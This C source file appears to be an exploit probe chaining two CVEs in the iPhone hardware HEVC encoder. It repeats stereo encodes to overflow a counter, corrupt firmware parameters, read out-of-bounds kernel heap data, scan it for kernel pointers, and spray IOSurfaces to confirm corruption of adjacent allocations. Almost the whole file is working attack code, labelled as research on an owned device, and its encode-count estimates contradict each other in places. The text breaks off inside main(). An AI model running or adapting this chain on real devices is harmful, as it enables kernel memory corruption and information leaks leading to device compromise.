/*
 * ave_full_chain.c — CVE-2026-114025 + CVE-2026-112465 Full Chain Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * This probe runs the COMPLETE exploitation sequence:
 * 1. Verify MV-HEVC support
 * 2. Measure NAL sizes and cumsum growth rate
 * 3. Test counter overflow survivability
 * 4. Test OOB READ (CVE-2026-112465) for kernel heap info leak
 * 5. Test firmware parameter corruption (+0x5ED4 -> 56-byte header overwrite)
 * 6. Test cross-buffer OOB with IOSurface spray
 *
 * Key thresholds:
 *   TABLE 1 (buffer+0x3770):
 *   Entry 256 (~86 encodes): First OOB write
 *   Entry 588 (~196 enc): Firmware param array start (+0x5C34)
 *   Entry 592 (~198 enc): +0x5C70 target pointer CORRUPTED → CRASH?
 *   Entry 593 (~198 enc): +0x5C88 source pointer (cumsum field)
 *   *** Entries 592+ REACHABLE ONLY IF firmware memcpy restores +0x5C88 each encode ***
 *   *** Use crash_test mode to determine reachability on-device ***
 *
 *   TABLE 2 (buffer+0x7DF4) — PRIMARY EXPLOITATION PATH:
 *   Entry 256 (~86 encodes): First OOB write
 *   Entry 466 (~155 enc): Past buffer end → HEAP OVERFLOW into adjacent alloc
 *   Safe window: 155-197 encodes (heap overflow without table 1 crash)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOSurface -framework IOKit
 *        -o AVEFullChain ave_full_chain.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avefullchain
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);
extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;
static volatile OSStatus g_cb_status = -999;
static volatile int g_cb_count = 0;
static volatile size_t g_last_pset_count = 0;
static volatile size_t g_last_pset_total_bytes = 0;
static CMFormatDescriptionRef g_saved_fmt = NULL; /* retained fmt desc from last callback */

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = status;
    g_cb_count++;
    g_encode_done = 1;

    if (buf && status == 0) {
        CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(buf);
        if (fmt) {
            size_t pset_count = 0;
            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fmt, 0, NULL, NULL, &pset_count, NULL);
            g_last_pset_count = pset_count;

            size_t total = 0;
            for (size_t i = 0; i < pset_count && i < 1000; i++) {
                size_t sz = 0;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    fmt, i, NULL, &sz, NULL, NULL);
                total += sz;
            }
            g_last_pset_total_bytes = total;

            if (g_saved_fmt) CFRelease(g_saved_fmt);
            g_saved_fmt = (CMFormatDescriptionRef)CFRetain(fmt);
        }
    }
}

static void dump_psets(CMFormatDescriptionRef fmt, size_t baseline) {
    if (!fmt) { rlog("No format description available\n"); return; }
    size_t count = 0;
    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, NULL, NULL, &count, NULL);
    rlog("Total parameter sets: %zu (baseline: %zu)\n\n", count, baseline);

    for (size_t i = 0; i < count && i < 500; i++) {
        const uint8_t *ptr = NULL;
        size_t sz = 0;
        int nal_hdr = 0;
        OSStatus st = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
            fmt, i, &ptr, &sz, NULL, &nal_hdr);
        if (st != 0) {
            rlog("  [%zu] ERROR: %d\n", i, (int)st);
            continue;
        }
        const char *label = (i < baseline) ? "" : " *** OOB ***";
        rlog("  [%zu] nal_hdr=%d size=%zu%s\n", i, nal_hdr, sz, label);

        if (ptr && sz > 0) {
            size_t dump_len = (sz > 256) ? 256 : sz;
            rlog("    ");
            for (size_t j = 0; j < dump_len; j++) {
                rlog("%02x", ptr[j]);
                if ((j + 1) % 32 == 0) rlog("\n    ");
                else if ((j + 1) % 8 == 0) rlog(" ");
            }
            if (dump_len < sz) rlog("... (%zu more bytes)", sz - dump_len);
            rlog("\n");

            /* Scan for kernel pointer patterns: 0xfffffe00XXXXXXXX */
            if (sz >= 8) {
                for (size_t j = 0; j <= sz - 8; j += 4) {
                    uint64_t qw = *(const uint64_t *)(ptr + j);
                    if ((qw >> 40) == 0xfffffe) {
                        rlog("    *** KERNEL PTR at byte %zu: 0x%016llx ***\n",
                             j, (unsigned long long)qw);
                    }
                }
            }
        }
    }
}

/* Global weak-import of iOS 17+ stereo encode API */
extern OSStatus VTCompressionSessionEncodeMultiImageFrame(
    VTCompressionSessionRef session,
    CMTaggedBufferGroupRef taggedBufferGroup,
    CMTime presentationTimeStamp,
    CMTime duration,
    CFDictionaryRef frameProperties,
    void *sourceFrameRefCon,
    VTEncodeInfoFlags *infoFlagsOut)
    __attribute__((weak_import));

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);
    if (st != noErr || !session) return NULL;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    int base = 0;
    CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);

    /* MVHEVCVideoLayerIDs */
    CFArrayRef layer_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
    OSStatus sp1 = VTSessionSetProperty(session, kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layer_arr);
    CFRelease(layer_arr);
    rlog("  MVHEVCVideoLayerIDs(%d,%d): %d\n", base, layer_id, (int)sp1);

    /* MVHEVCViewIDs */
    CFArrayRef view_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
    OSStatus sp2 = VTSessionSetProperty(session, kVTCompressionPropertyKey_MVHEVCViewIDs, view_arr);
    CFRelease(view_arr);
    rlog("  MVHEVCViewIDs: %d\n", (int)sp2);

    /* MVHEVCLeftAndRightViewIDs (REQUIRED for stereo encode) */
    CFArrayRef lr_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
    OSStatus sp3 = VTSessionSetProperty(session, kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs, lr_arr);
    CFRelease(lr_arr);
    rlog("  MVHEVCLeftAndRightViewIDs: %d\n", (int)sp3);

    /* HeroEye = left */
    VTSessionSetProperty(session, kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
    /* HasLeftStereoEyeView + HasRightStereoEyeView */
    VTSessionSetProperty(session, kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
    /* StereoCameraBaseline */
    uint32_t baseline = 64000;
    CFNumberRef bl = CFNumberCreate(NULL, kCFNumberSInt32Type, &baseline);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_StereoCameraBaseline, bl);
    CFRelease(bl);
    /* ProfileLevel Main10 */
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel,
        kVTProfileLevel_HEVC_Main10_AutoLevel);

    CFRelease(n0); CFRelease(n1);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

static int encode_one(VTCompressionSessionRef session, int frame_idx, int w, int h) {
    CVPixelBufferRef pb = create_pb(w, h);
    if (!pb) return -1;
    g_encode_done = 0;
    g_cb_status = -999;
    CMTime pts = CMTimeMake(frame_idx, 30);
    CMTime dur = CMTimeMake(1, 30);
    OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
    if (st != noErr) {
        rlog("  EncodeFrame error: %d\n", (int)st);
        CVPixelBufferRelease(pb);
        return (int)st;
    }
    /* Poll for callback — do NOT use CompleteFrames here as it blocks if
       the encoder never produces output (observed on iPhone Duo A20 Pro). */
    for (int i = 0; i < 300 && !g_encode_done; i++) usleep(10000); /* 3s */
    CVPixelBufferRelease(pb);
    if (!g_encode_done) {
        rlog("  WARNING: callback not received after 3s (status=%d)\n", (int)g_cb_status);
    }
    return (int)g_cb_status;
}

static CVPixelBufferRef create_yuv_pb_stereo(int w, int h, uint8_t y_fill) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *yp = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    void *uvp = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (yp) memset(yp, y_fill, CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * h);
    if (uvp) memset(uvp, 128, CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * (h / 2));
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static int encode_one_stereo_kf(VTCompressionSessionRef session, int frame_idx, int w, int h, int layer_id, int force_kf) {
    if (!VTCompressionSessionEncodeMultiImageFrame) return -99;
    CVPixelBufferRef pb_left = create_yuv_pb_stereo(w, h, 0x40);
    CVPixelBufferRef pb_right = create_yuv_pb_stereo(w, h, 0x80);
    if (!pb_left || !pb_right) {
        if (pb_left) CVPixelBufferRelease(pb_left);
        if (pb_right) CVPixelBufferRelease(pb_right);
        return -1;
    }
    CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
    CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
    CMTagCollectionRef ltc = NULL;
    CMTagCollectionCreate(NULL, left_tags, 2, &ltc);
    CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, layer_id);
    CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
    CMTagCollectionRef rtc = NULL;
    CMTagCollectionCreate(NULL, right_tags, 2, &rtc);
    CMTagCollectionRef tcs[2] = { ltc, rtc };
    CVPixelBufferRef pbs[2] = { pb_left, pb_right };
    CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
    CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
    CMTaggedBufferGroupRef tbg = NULL;
    OSStatus tbg_st = CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
    CFRelease(tc_arr); CFRelease(pb_arr);
    if (tbg_st != 0 || !tbg) {
        CFRelease(ltc); CFRelease(rtc);
        CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
        return -2;
    }
    g_encode_done = 0;
    g_cb_status = -999;
    VTEncodeInfoFlags fi = 0;
    CMTime pts = CMTimeMake(frame_idx, 30);
    CMTime dur = CMTimeMake(1, 30);
    CFDictionaryRef props = NULL;
    if (force_kf) {
        CFMutableDictionaryRef mp = CFDictionaryCreateMutable(NULL, 1,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(mp, kVTEncodeFrameOptionKey_ForceKeyFrame, kCFBooleanTrue);
        props = mp;
    }
    OSStatus st = VTCompressionSessionEncodeMultiImageFrame(
        session, tbg, pts, dur, props, NULL, &fi);
    if (props) CFRelease(props);
    if (st != noErr) {
        CFRelease(tbg); CFRelease(ltc); CFRelease(rtc);
        CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
        return (int)st;
    }
    for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
    CFRelease(tbg); CFRelease(ltc); CFRelease(rtc);
    CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
    if (!g_encode_done) {
        rlog("  WARNING: stereo callback not received after 5s\n");
    }
    return (int)g_cb_status;
}

static int encode_one_stereo_lid(VTCompressionSessionRef session, int frame_idx, int w, int h, int layer_id) {
    return encode_one_stereo_kf(session, frame_idx, w, h, layer_id, 0);
}

static int encode_one_stereo(VTCompressionSessionRef session, int frame_idx, int w, int h) {
    return encode_one_stereo_kf(session, frame_idx, w, h, 1, 0);
}

/* Phase 1: Verify MV-HEVC */
static int phase1_verify(void) {
    rlog("\n========== PHASE 1: MV-HEVC Support ==========\n");
    if (!VTCompressionSessionEncodeMultiImageFrame) {
        rlog("FAILED: EncodeMultiImageFrame not available (needs iOS 17+)\n");
        return -1;
    }
    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
    if (!s) {
        rlog("FAILED: MV-HEVC not supported on this device\n");
        rlog("MV-HEVC requires iPhone 15 Pro or later.\n");
        return -1;
    }
    int st = encode_one_stereo(s, 0, 1920, 1080);
    rlog("First stereo encode: status=%d, pset_count=%zu, bytes=%zu\n",
         st, g_last_pset_count, g_last_pset_total_bytes);
    VTCompressionSessionInvalidate(s); CFRelease(s);
    if (st != 0) {
        rlog("FAILED: Stereo encode error %d\n", st);
        return -1;
    }
    rlog("PASS: MV-HEVC stereo encoder works, %zu parameter sets per frame\n", g_last_pset_count);
    return 0;
}

/* Phase 2: Measure NAL sizes and cumsum growth */
static int phase2_measure(void) {
    rlog("\n========== PHASE 2: NAL Size Measurement ==========\n");
    rlog("Each MV-HEVC stereo encode produces ~4 NAL entries (VPS+SPS+SPS+PPS)\n");
    rlog("Entry format: [NAL_type(4), layer_id(4), cumsum(4), data>>3(4)]\n");
    rlog("OOB starts when counter > 256 entries (~64 encodes with pset=4)\n\n");

    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
    if (!s) return -1;

    for (int i = 0; i < 10; i++) {
        int st = encode_one_stereo(s, i, 1920, 1080);
        rlog("[%d] status=%d, psets=%zu, total_bytes=%zu\n",
             i, st, g_last_pset_count, g_last_pset_total_bytes);
        if (st != 0) break;
    }
    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);
    VTCompressionSessionInvalidate(s); CFRelease(s);

    rlog("\nExpected: ~4 entries/encode, cumsum grows with 1920x1080 frames\n");
    rlog("Cumsum limit: 0x801 (2049) — check if large frames stay under\n");
    return 0;
}

/* Phase 3: Counter overflow */
static int phase3_overflow(int max_encodes) {
    rlog("\n========== PHASE 3: Counter Overflow (%d encodes) ==========\n", max_encodes);
    rlog("OOB entry thresholds (table 1, pset=4/enc):\n");
    rlog("  256 (~64 enc): First write past VPS sub-object boundary\n");
    rlog("  588 (~147 enc): Firmware param array +0x5C34\n");
    rlog("  592 (~148 enc): +0x5C70 target pointer — CRASH BOUNDARY\n");
    rlog("OOB entry thresholds (table 2 — PRIMARY PATH):\n");
    rlog("  466 (~117 enc): Past buffer end → HEAP OVERFLOW\n\n");

    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
    if (!s) return -1;

    int first_error = -1;
    int errors = 0;
    for (int i = 0; i < max_encodes; i++) {
        int st = encode_one_stereo(s, i, 1920, 1080);
        if (st != 0) {
            if (first_error < 0) first_error = i;
            errors++;
            rlog("[%d] ERROR: %d (total errors: %d)\n", i, st, errors);
            if (errors >= 10) {
                rlog("Too many errors, stopping\n");
                break;
            }
        }
        if ((i+1) % 25 == 0 || i == max_encodes-1) {
            int est_entries = (i+1) * 3;
            rlog("[%d/%d] psets=%zu, bytes=%zu, errors=%d, ~%d entries (OOB: %s)\n",
                 i+1, max_encodes, g_last_pset_count, g_last_pset_total_bytes, errors,
                 est_entries, est_entries > 256 ? "YES" : "no");
        }
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);
    VTCompressionSessionInvalidate(s); CFRelease(s);

    if (first_error >= 0)
        rlog("\nFIRST ERROR at encode %d (~%d entries)\n", first_error, first_error * 3);
    else
        rlog("\nALL %d ENCODES SUCCEEDED — OOB corruption occurred SILENTLY\n", max_encodes);

    return errors;
}

/* Phase 4: OOB Read test (CVE-2026-112465) */
static int phase4_oob_read(int encodes) {
    rlog("\n========== PHASE 4: OOB Read (CVE-2026-112465) ==========\n");
    rlog("After counter overflow, READ path at 0x18a9610 iterates past boundary\n");
    rlog("CMVideoFormatDescriptionGetHEVCParameterSetAtIndex may return heap data\n");
    rlog("Encoding %d frames, tracking parameter set count/size changes\n\n", encodes);

    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
    if (!s) return -1;

    size_t baseline_count = 0, baseline_bytes = 0;
    size_t max_count = 0, max_bytes = 0;
    for (int i = 0; i < encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (i == 0) {
            baseline_count = g_last_pset_count;
            baseline_bytes = g_last_pset_total_bytes;
            rlog("Baseline: psets=%zu, bytes=%zu\n", baseline_count, baseline_bytes);
        }
        if (g_last_pset_count > max_count) max_count = g_last_pset_count;
        if (g_last_pset_total_bytes > max_bytes) max_bytes = g_last_pset_total_bytes;
        if (st != 0) {
            rlog("[%d] Error: %d\n", i, st);
            break;
        }
        if ((i+1) % 50 == 0 || i == encodes-1)
            rlog("[%d] psets=%zu (max=%zu), bytes=%zu (max=%zu)\n",
                 i+1, g_last_pset_count, max_count, g_last_pset_total_bytes, max_bytes);
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);

    rlog("\nFinal: psets=%zu (baseline=%zu, max=%zu)\n",
         g_last_pset_count, baseline_count, max_count);
    rlog("       bytes=%zu (baseline=%zu, max=%zu)\n",
         g_last_pset_total_bytes, baseline_bytes, max_bytes);

    if (max_count > baseline_count) {
        rlog("*** OOB READ DETECTED: pset count grew from %zu to %zu ***\n",
             baseline_count, max_count);
        rlog("*** Extra entries contain KERNEL HEAP DATA ***\n");
    } else if (max_bytes > baseline_bytes * 2) {
        rlog("*** POSSIBLE OOB READ: total bytes grew significantly ***\n");
    } else {
        rlog("No obvious OOB read detected in parameter set metadata\n");
        rlog("Note: read path may use separate counter or clamp differently\n");
    }

    VTCompressionSessionInvalidate(s); CFRelease(s);
    return 0;
}

/* Phase 5: Firmware parameter corruption with controlled layer_id */
static int phase5_firmware(int encodes, int layer_id) {
    rlog("\n========== PHASE 5: Firmware Param Corruption ==========\n");
    rlog("Target: %d encodes with layer_id=%d (0x%x)\n", encodes, layer_id, layer_id);
    rlog("layer_id is written at byte position 4 of each 16-byte entry\n");
    rlog("All key targets at byte 4 = layer_id = FULLY CONTROLLED:\n");
    rlog("  +0x5D14 (entry 602): guard array — layer_id misroutes params\n");
    rlog("  +0x5ED4 (entry 630): 56-byte SIMD overwrite source\n");
    rlog("  +0x5F94 (entry 642): nonzero forces BLRAA indirect call\n");
    rlog("  +0x6414 (entry 714): W24 config override\n\n");

    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, layer_id);
    if (!s) return -1;

    int errors = 0;
    for (int i = 0; i < encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (st != 0) {
            errors++;
            rlog("[%d] Error: %d\n", i, st);
            if (errors >= 5) break;
        }
        if ((i+1) % 25 == 0 || i == encodes-1) {
            int est_entries = (i+1) * 3;
            const char *target = "pre-OOB";
            if (est_entries >= 714) target = "+0x6414 W24 REACHED";
            else if (est_entries >= 642) target = "+0x5F94 BLRAA REACHED";
            else if (est_entries >= 630) target = "+0x5ED4 SIMD REACHED";
            else if (est_entries >= 602) target = "+0x5D14 guard REACHED";
            else if (est_entries >= 256) target = "OOB active";
            rlog("[%d/%d] status=%d, ~%d entries, %s\n",
                 i+1, encodes, (int)g_cb_status, est_entries, target);
        }
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);

    rlog("\nPost-corruption test encode...\n");
    int st = encode_one(s, encodes, 128, 128);
    rlog("Post-corruption: status=%d\n", st);

    VTCompressionSessionInvalidate(s); CFRelease(s);

    if (errors == 0)
        rlog("ALL %d ENCODES SUCCEEDED — firmware params silently corrupted\n", encodes);
    return errors;
}

/* Phase 6: IOSurface spray + encode for cross-buffer corruption detection */
#define SPRAY_COUNT 64

static IOSurfaceRef g_surfaces[SPRAY_COUNT];

static IOSurfaceRef create_spray_surface(int idx) {
    int alloc = 36864;
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 96, h = 96, bpr = 384;
    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef nalloc = CFNumberCreate(NULL, kCFNumberIntType, &alloc);
    int fmt = 0x42475241;
    CFNumberRef nfmt = CFNumberCreate(NULL, kCFNumberIntType, &fmt);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);
    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc);
    CFRelease(nfmt); CFRelease(props);
    if (surf) {
        uint32_t tag = 0x53505259;
        CFNumberRef nsen = CFNumberCreate(NULL, kCFNumberIntType, &tag);
        IOSurfaceSetValue(surf, CFSTR("SprayTag"), nsen);
        CFRelease(nsen);
        IOSurfaceLock(surf, 0, NULL);
        void *base = IOSurfaceGetBaseAddress(surf);
        if (base) {
            memset(base, 0xAA, alloc);
            uint32_t *p32 = (uint32_t *)base;
            p32[0] = tag;
            p32[1] = (uint32_t)idx;
            for (int m = 4096; m < alloc; m += 4096) {
                p32[m/4] = 0xBEAC0000 | (idx & 0xFFFF);
            }
        }
        IOSurfaceUnlock(surf, 0, NULL);
    }
    return surf;
}

static int phase6_spray(int encodes) {
    rlog("\n========== PHASE 6: IOSurface Spray + OOB ==========\n");
    rlog("Spray %d IOSurfaces (36864 bytes each = kalloc.49152)\n", SPRAY_COUNT);
    rlog("HEVC buffer is ~39696 bytes in kalloc.49152 (or kalloc_data)\n");
    rlog("If HEVC buffer lands adjacent, OOB past entry 1059 (~353 enc)\n");
    rlog("corrupts next allocation\n\n");

    rlog("Phase 6a: Pre-spray %d surfaces\n", SPRAY_COUNT/2);
    for (int i = 0; i < SPRAY_COUNT/2; i++)
        g_surfaces[i] = create_spray_surface(i);

    rlog("Phase 6b: Create encoder (allocates HEVC buffer)\n");
    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 0x4141);
    if (!s) {
        rlog("FAILED: Could not create encoder\n");
        for (int i = 0; i < SPRAY_COUNT/2; i++)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
        return -1;
    }

    rlog("Phase 6c: Post-spray %d more surfaces\n", SPRAY_COUNT/2);
    for (int i = SPRAY_COUNT/2; i < SPRAY_COUNT; i++)
        g_surfaces[i] = create_spray_surface(i);

    rlog("Phase 6d: Encode %d frames (need ~353 for cross-buffer)\n", encodes);
    int errors = 0;
    for (int i = 0; i < encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (st != 0) {
            errors++;
            rlog("[%d] Error: %d\n", i, st);
            if (errors >= 5) break;
        }
        if ((i+1) % 50 == 0 || i == encodes-1) {
            int est_entries = (i+1) * 3;
            rlog("[%d/%d] ~%d entries, cross-buffer: %s\n",
                 i+1, encodes, est_entries,
                 est_entries > 1059 ? "REACHED" : "not yet");
        }
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);

    rlog("\nPhase 6e: Check spray surfaces for corruption\n");
    int corrupted = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (!g_surfaces[i]) continue;
        IOSurfaceLock(g_surfaces[i], 1, NULL);
        void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
        if (base) {
            uint32_t *p32 = (uint32_t *)base;
            int changes = 0;
            for (int j = 2; j < 9216; j++) {
                if (p32[j] != 0xAAAAAAAA) {
                    if (!changes) {
                        rlog("  SURFACE[%d] CORRUPTED at +0x%x: 0x%08x (expected 0xAAAAAAAA)\n",
                             i, j*4, p32[j]);
                        for (int k = (j>2?j-2:0); k < j+8 && k < 9216; k++)
                            rlog("    [+0x%04x] 0x%08x%s\n", k*4, p32[k],
                                 p32[k] != 0xAAAAAAAA ? " *" : "");
                    }
                    changes++;
                }
            }
            if (changes) {
                corrupted++;
                rlog("  Surface[%d]: %d words changed\n", i, changes);
            }
        }
        IOSurfaceUnlock(g_surfaces[i], 1, NULL);
    }

    rlog("\nCorrupted surfaces: %d / %d\n", corrupted, SPRAY_COUNT);
    if (corrupted > 0)
        rlog("*** CROSS-BUFFER OOB INTO ADJACENT ALLOCATION CONFIRMED ***\n");

    VTCompressionSessionInvalidate(s); CFRelease(s);
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
    return corrupted;
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_full_chain.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 + CVE-2026-112465 Full Chain Probe ===\n");
    rlog("Target: iPhone Duo (A20 Pro, iOS 27.1)\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "help";

    if (strcmp(mode, "quick") == 0) {
        rlog("QUICK: Phases 1-3 (verify + measure + 100 encodes)\n\n");
        if (phase1_verify() != 0) goto done;
        phase2_measure();
        phase3_overflow(100);

    } else if (strcmp(mode, "standard") == 0) {
        rlog("STANDARD: Phases 1-4 (+ 250 encodes + OOB read)\n\n");
        if (phase1_verify() != 0) goto done;
        phase2_measure();
        phase3_overflow(250);
        phase4_oob_read(300);

    } else if (strcmp(mode, "full") == 0) {
        rlog("FULL: All 6 phases\n\n");
        if (phase1_verify() != 0) goto done;
        phase2_measure();
        phase3_overflow(100);
        phase4_oob_read(300);
        phase5_firmware(220, 0x4141);
        phase6_spray(400);

